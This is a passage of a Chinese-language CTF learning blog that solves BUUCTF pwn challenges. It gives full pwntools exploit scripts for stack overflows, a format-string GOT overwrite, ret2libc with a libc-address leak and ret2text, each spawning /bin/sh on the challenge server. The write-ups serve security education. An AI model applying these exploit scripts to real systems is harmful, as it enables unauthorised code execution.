href="https://blog.csdn.net/BlizCp/article/details/112056833?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167205543616800182763246%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167205543616800182763246&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-112056833-null-null.142%5Ev68%5Econtrol,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&utm_term=sprintf%E5%87%BD%E6%95%B0&spm=1018.2226.3001.4187">sprintf函数<i class="fas fa-external-link-alt"></i></a>            <a class="link" href="https://blog.csdn.net/IOT2017/article/details/84137728?ops_request_misc=&request_id=&biz_id=102&utm_term=C%E8%AF%AD%E8%A8%80write%E5%87%BD%E6%95%B0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-84137728.142%5Ev68%5Econtrol,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&spm=1018.2226.3001.4187">write函数<i class="fas fa-external-link-alt"></i></a></p><h2 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/image-20221226201240586.kop6vd2s8j4.webp"></p><p><a class="link" href="https://blog.csdn.net/you_shou/article/details/51248677?ops_request_misc=&request_id=&biz_id=102&utm_term=setvbuf%E5%87%BD%E6%95%B0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-51248677.142%5Ev68%5Econtrol,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&spm=1018.2226.3001.4187">setvbuf函数<i class="fas fa-external-link-alt"></i></a></p><p><mark>这里记录一个坑，流和缓冲区的知识</mark></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/image-20221226202344593.36lr8pn9xczk.webp"></p><p>这道题有意思，虽然可以用是ret2text，但是增加了基本判断条件.</p><p>即有两种主流方法：ret2text and 改v2的值</p><p>记录一下改v2的值（计算机内浮点数的表示）</p><blockquote><p>11.28125<br>转换成二进制：1011.001001 = 1.01101001 * 10^3<br>bin(127+3) =10000010<br>0 10000010 01101001<br>因为是float补齐32位<br>0100 0001 0011 0100 1000 0000 0000 0000</p></blockquote><p>参考资料：</p><p><a class="link" href="https://blog.csdn.net/qq_34720818/article/details/108285655?ops_request_misc=&request_id=&biz_id=102&utm_term=%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%B5%AE%E7%82%B9%E6%95%B0%E5%A6%82%E4%BD%95%E5%9C%A8%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%86%85%E5%AD%98%E5%82%A8&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-108285655.142%5Ev68%5Econtrol,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&spm=1018.2226.3001.4187">浮点数(小数)在计算机中如何用二进制存储？<i class="fas fa-external-link-alt"></i></a></p><p><a class="link" href="https://blog.csdn.net/m0_51688704/article/details/126222981?ops_request_misc=&request_id=&biz_id=102&utm_term=%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%B5%AE%E7%82%B9%E6%95%B0%E5%A6%82%E4%BD%95%E5%9C%A8%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%86%85%E5%AD%98%E5%82%A8&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-126222981.142%5Ev68%5Econtrol,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&spm=1018.2226.3001.4187">浮点数在计算机内存中是如何存储的？一文带你了解详情<i class="fas fa-external-link-alt"></i></a></p><h2 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/image-20221227213546545.jfzw85m4r5c.webp"></p><p><a class="link" href="https://blog.csdn.net/digitalkee/article/details/122490373?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167214816316800188546026%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167214816316800188546026&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-122490373-null-null.142%5Ev68%5Econtrol,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&utm_term=fgets%E5%87%BD%E6%95%B0&spm=1018.2226.3001.4187">fgets<i class="fas fa-external-link-alt"></i></a></p><p>显然漏洞在strcpy，明显栈溢出漏洞。</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/image-20221227221717511.3toatkp5hegw.webp"></p><p>比较奇怪，输入32个字节，只输出31字节</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;I&#x27; * 20+b&#x27;a&#x27;*(0x4) + p64(0x08048F13)</span><br></pre></td></tr></table></figure><h2 id="0x5"><a href="#0x5" class="headerlink" title="0x5"></a>0x5</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/image-20230108191008284.54osqokl7ibk.webp"></p><p>ret2text没啥好说的</p><p><mark>read函数的学习</mark></p><h2 id="0x6-第五空间2019-决赛-PWN5"><a href="#0x6-第五空间2019-决赛-PWN5" class="headerlink" title="0x6.[第五空间2019 决赛]PWN5"></a>0x6.[第五空间2019 决赛]PWN5</h2><h3 id="1-题目详情"><a href="#1-题目详情" class="headerlink" title="1.题目详情"></a>1.题目详情</h3><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/image-20230110205820206.1x795if2y51c.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/image-20230110205943458.47hxr869dgzk.webp"></p><h3 id="2-题目分析"><a href="#2-题目分析" class="headerlink" title="2.题目分析"></a>2.题目分析</h3><ol><li><a class="link" href="https://blog.csdn.net/u010806950/article/details/105505540?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167331730916782425683150%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167331730916782425683150&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-105505540-null-null.142%5Ev70%5Econtrol,201%5Ev4%5Eadd_ask&utm_term=atoi%E5%87%BD%E6%95%B0&spm=1018.2226.3001.4187">atoi函数<i class="fas fa-external-link-alt"></i></a>：把字符串nptr转换为int。<a class="link" href="https://blog.csdn.net/Hush_H/article/details/127405849?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167331730916782425683150%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167331730916782425683150&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-127405849-null-null.142%5Ev70%5Econtrol,201%5Ev4%5Eadd_ask&utm_term=atoi%E5%87%BD%E6%95%B0&spm=1018.2226.3001.4187">atoi函数2<i class="fas fa-external-link-alt"></i></a></li><li>这道题，我左思右想都没想明白该怎么去做，无奈之下去网上搜了一下Writeup，一看居然是考的是<mark>格式化字符串漏洞</mark>，我还傻傻的拿着我只有ret2text/ret2shellcode/ret2syscall的知识体系去解题……慢慢积累吧！</li><li>格式化字符串漏洞的成因在于像<code>printf/sprintf/snprintf</code>等格式化打印函数都是接受可变参数的，而一旦程序编写不规范，比如正确的写法是：<code>printf(&quot;%s&quot;, pad)</code>，偷懒写成了：<code>printf(pad)</code>，此时就存在格式化字符串漏洞。</li><li><strong>（存疑）</strong>__readgsdword函数：由于程序开启了Canary保护，我在网上搜索发现这个函数貌似是调用得到canary的值的函数。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">printf(&quot;the third is %3$d, the first is %1$d&quot;,1,2,3,4,5,6);</span></span><br><span class="line"><span class="string"># the third is 3, the first is 1</span></span><br><span class="line"><span class="string">----------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">p32(0x804c044)+p32(0x804c045)+p32(0x804c046)+p32(0x804c047)+b&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br><span class="line"><span class="string">前面的&quot;字符串&quot;有16位对应0x10即把该值修改为0x10101010</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#方法一</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27; </span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line">io = process(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/7&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,25737)</span></span><br><span class="line">payload = p32(<span class="number">0x804c044</span>)+p32(<span class="number">0x804c045</span>)+p32(<span class="number">0x804c046</span>)+p32(<span class="number">0x804c047</span>)+<span class="string">b&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x10101010</span>))</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#方法二</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/7&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,25068)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/7&quot;</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;atoi_got:system_plt&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x7-ciscn-2019-c-1"><a href="#0x7-ciscn-2019-c-1" class="headerlink" title="0x7.ciscn_2019_c_1"></a>0x7.ciscn_2019_c_1</h2><ol><li><a class="link" href="https://blog.csdn.net/weixin_44162361/article/details/115790452?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167361105116800180632775%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167361105116800180632775&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-115790452-null-null.142%5Ev71%5Ewechat,201%5Ev4%5Eadd_ask&utm_term=memset%E5%87%BD%E6%95%B0&spm=1018.2226.3001.4187">memset函数<i class="fas fa-external-link-alt"></i></a></li></ol><h3 id="题目详情"><a href="#题目详情" class="headerlink" title="题目详情"></a>题目详情</h3><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/image-20230113201313206.4jqyhi45uohs.webp"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><ol><li>发现了危险函数gets但是开启了NX保护排除text和shellcode。我目测估计是syscall。试试吧！但是，我发现程序里面并没有”/bin/sh”。所以考虑一下ret2libc中没有”/bin/sh”，没有system函数的调用地址的情况即是<code>ret2libc3</code></li></ol><h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><p>​    <strong>第一种：LibSearcher</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#c = process(&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/8&quot;)</span></span><br><span class="line">c = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26837</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/8&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400c83</span></span><br><span class="line">ret = <span class="number">0x00000000004006b9</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&quot;\x00&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x57</span>,pop_rdi_ret,libc_start_main_got,puts_plt,main])</span><br><span class="line">c.sendlineafter(<span class="string">b&quot;Input your choice!\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">c.recvuntil(<span class="string">b&quot;Input your Plaintext to be encrypted\n&quot;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.recvuntil(<span class="string">b&quot;Ciphertext\n&quot;</span>)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)<span class="comment"># 因为Encrypted函数最后返回时再次调用了puts函数</span></span><br><span class="line"></span><br><span class="line">libc_start_main_addr = u64(c.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print((c.recvline()))        # b&#x27;\xb0\x8a6\x85\xc0\x7f\n&#x27;                </span></span><br><span class="line"><span class="string">print((c.recvline())[:-1])      # discard &#x27;\n&#x27;</span></span><br><span class="line"><span class="string">print((c.recvline())[:-1].ljust(8,b&#x27;\0&#x27;)) #左对齐，凑齐八字节，不足用&#x27;\0&#x27;补齐</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Here!!!!!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_start_main_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取libc版本</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,libc_start_main_addr)</span><br><span class="line"><span class="comment"># 偏移量</span></span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line"><span class="comment"># system &amp; bin_sh 真实地址</span></span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh = libcbase + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">c.sendlineafter(<span class="string">b&quot;Input your choice!\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;\x00&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x57</span>,ret,pop_rdi_ret,bin_sh,system_addr])</span><br><span class="line"><span class="comment"># 这里的ret指令是为了堆栈平衡，如果不加的话在调用system函数之前，88+8*2 =104 mod 16 ≠ 0 ，调用会失败。</span></span><br><span class="line"><span class="comment"># 调用ret后，在调用system函数之前，88+8*3 =112 mod 16 ＝ 0 ，调用成功。</span></span><br><span class="line">c.recvuntil(<span class="string">b&quot;Input your Plaintext to be encrypted\n&quot;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>​    <strong>第二种：手动 libc database search</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/8&quot;)</span></span><br><span class="line">c = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26837</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/BUU/8&quot;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400c83</span></span><br><span class="line">ret = <span class="number">0x00000000004006b9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&quot;\x00&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x57</span>,pop_rdi_ret,libc_start_main_got,puts_plt,main])</span><br><span class="line">c.sendlineafter(<span class="string">b&quot;Input your choice!\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">c.recvuntil(<span class="string">b&quot;Input your Plaintext to be encrypted\n&quot;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.recvuntil(<span class="string">b&quot;Ciphertext\n&quot;</span>)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">libc_start_main_addr = u64(c.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Here!!!!!&quot;</span>)</span><br><span class="line"><span class="comment"># 利用泄露出来的libc_start_main_addr的末12位（对应3位16进制）在libc database search中搜索</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_start_main_addr)) </span><br><span class="line"></span><br><span class="line">libcbase = libc_start_main_addr-<span class="number">0x021ab0</span></span><br><span class="line">system_addr = libcbase + <span class="number">0x04f440</span></span><br><span class="line">bin_sh = libcbase + <span class="number">0x1b3e9a</span></span><br><span class="line">c.sendlineafter(<span class="string">b&quot;Input your choice!\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;\x00&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x57</span>,ret,pop_rdi_ret,bin_sh,system_addr])</span><br><span class="line">c.recvuntil(<span class="string">b&quot;Input your Plaintext to be encrypted\n&quot;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.1w1i75ahwp8g.webp"></p><h3 id="Get-flag！"><a href="#Get-flag！" class="headerlink" title="Get flag！"></a>Get flag！</h3><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.6lkaymio68lc.webp"></p><h2 id="0x8-ciscn-2019-n-8"><a href="#0x8-ciscn-2019-n-8" class="headerlink" title="0x8.ciscn_2019_n_8"></a>0x8.ciscn_2019_n_8</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.4nqinxmwlx1c.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.4ch8nuo8by9s.webp"></p><p>​    一眼格式化字符串漏洞，先不做，等后面具体学到的时候再做。</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230304/%E5%9B%BE%E7%89%87.1b3db6v08sjk.webp"></p><p>​    看起来很难，实则FMT的漏洞都没利用，直接利用scanf函数直接将var[13]改为0x11，然后getshell。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27852</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>*<span class="number">13</span> + p32(<span class="number">0x11</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="0x9-jarvisoj-level2"><a href="#0x9-jarvisoj-level2" class="headerlink" title="0x9.jarvisoj_level2"></a>0x9.jarvisoj_level2</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.1sq2h0835mgw.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.3796vqjfkw00.webp"></p><p>​    两者都有，简单题。</p><h3 id="方法一：ret2libc1"><a href="#方法一：ret2libc1" class="headerlink" title="方法一：ret2libc1"></a>方法一：ret2libc1</h3><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">c = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27861</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">system_plt = <span class="number">0x8048320</span></span><br><span class="line">bin_sh = <span class="number">0x0804a024</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c.recvuntil(b&#x27;echo Input:&#x27;)</span></span><br><span class="line">c.recvuntil(<span class="string">b&quot;Input:&quot;</span>)</span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8c</span>,system_plt,<span class="string">&#x27;aaaa&#x27;</span>,bin_sh])</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.6p9fegs2e6f4.webp"></p><pre><code> 我在这里犯了一个简单的错误：</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c.recvuntil(<span class="string">b&#x27;echo Input:&#x27;</span>)<span class="comment">#×</span></span><br><span class="line">c.recvuntil(<span class="string">b&quot;Input:&quot;</span>)     <span class="comment">#√</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.5v9djifmcf40.webp"></p><h3 id="方法二：ret2syscall"><a href="#方法二：ret2syscall" class="headerlink" title="方法二：ret2syscall"></a>方法二：ret2syscall</h3><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.48qji9fk6074.webp"></p><p>​    <code>int 80</code>都没有，遂放弃这种方法。</p><h2 id="0x0a-bjdctf-2020-babystack"><a href="#0x0a-bjdctf-2020-babystack" class="headerlink" title="0x0a.bjdctf_2020_babystack"></a>0x0a.bjdctf_2020_babystack</h2><h3 id="方法一：ret2libc1-1"><a href="#方法一：ret2libc1-1" class="headerlink" title="方法一：ret2libc1"></a>方法一：ret2libc1</h3><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.1kc6eqo5murk.webp"></p><p>​    根据题目描述应该是<code>签到题</code></p><p>​    <mark>始终要明确位数！传参规则！</mark></p><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">c =remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28531</span>)</span><br><span class="line">bin_sh = <span class="number">0x0000000000400858</span></span><br><span class="line">ret = <span class="number">0x0400561</span></span><br><span class="line">pop_rdi_ret =<span class="number">0x0000000000400833</span></span><br><span class="line">system_addr = <span class="number">0x400590</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&quot;[+]Please input the length of your name:\n&quot;</span>)</span><br><span class="line">c.sendline(<span class="string">b&quot;100&quot;</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&quot;[+]What&#x27;s u name?\n&quot;</span>)</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+ p64(pop_rdi_ret) + p64(bin_sh) + p64(system_addr)</span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>,pop_rdi_ret,bin_sh,system_addr])</span><br><span class="line">c.sendline(payload1)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.4rn0yh4ygbr4.webp"></p><p>​    不知道为什么用flat生成的payload一直报错</p><p><code>timeout: the monitored command dumped core</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.3s1bjkoc9xs0.webp"></p><p>​    但是用p64() 是可以打通的：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/image-20230117153441613.17xxt63q3cow.webp"></p><h3 id="方法二-ret2syscall-64"><a href="#方法二-ret2syscall-64" class="headerlink" title="方法二 ret2syscall 64"></a>方法二 ret2syscall 64</h3><p><img lazyload alt="image" 